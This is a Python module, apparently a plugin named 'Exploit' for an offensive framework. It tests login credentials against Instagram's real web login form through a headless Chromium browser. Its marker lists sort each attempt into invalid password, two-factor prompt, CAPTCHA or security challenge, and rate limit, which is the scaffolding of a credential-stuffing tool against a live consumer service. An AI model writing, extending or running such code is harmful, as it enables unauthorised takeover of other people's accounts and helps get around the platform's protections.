"""Instagram Credential Tester — headless-browser login flow.

Instagram's private API requires an enc_password + CSRF/device signing, so the
reliable path is driving the web login form through a real Chromium.
"""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Instagram Credential Tester"
    description = "Tests credentials against Instagram's web login via a headless browser. Detects bad passwords, 2FA, rate limits, and challenges."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "instagram"
    browser_login_url = "https://www.instagram.com/accounts/login/"
    username_selector = "input[name=email]"
    password_selector = "input[name=pass]"
    submit_selectors = ("input[type=submit]", "button[type=submit]")
    browser_login_paths = ("/accounts/login",)
    twofa_markers = (
        "two-factor", "two factor", "2fa", "verification code", "confirm it's you",
        "check your messages", "enter the code",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "are you a robot",
        "we noticed unusual", "confirm your identity",
    )
    rate_markers = (
        "too many attempts", "try again later", "maximum number of attempts",
        "temporarily", "rate limit", "please wait a few minutes",
    )
    invalid_markers = (
        "the login information you entered is incorrect", "login information you entered is incorrect",
        "sorry, your password was incorrect", "incorrect password", "password was incorrect",
        "invalid username", "username doesn't exist", "we couldn't find", "not found",
    )
